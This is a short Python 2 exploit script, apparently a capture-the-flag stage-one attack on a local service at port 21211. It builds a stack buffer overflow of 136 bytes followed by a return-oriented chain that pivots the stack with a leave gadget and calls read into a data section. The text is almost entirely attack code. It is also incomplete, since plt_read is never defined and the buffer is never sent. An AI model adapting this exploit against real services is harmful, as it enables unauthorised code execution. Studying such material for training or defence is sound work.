import socket
import struct
import telnetlib


HOST="localhost"
PORT=21211

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

leave_addr=0x080482ea
data_addr =0x8049620




print "[*] Stage1 start"

buf="A"*136
buf+=struct.pack("<I",data_addr+0x100-0x4)
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",leave_addr)
buf+=struct.pack("<I",0)
buf+=struct.pack("<I",data_addr+0x100)
buf+=struct.pack("<I",512)
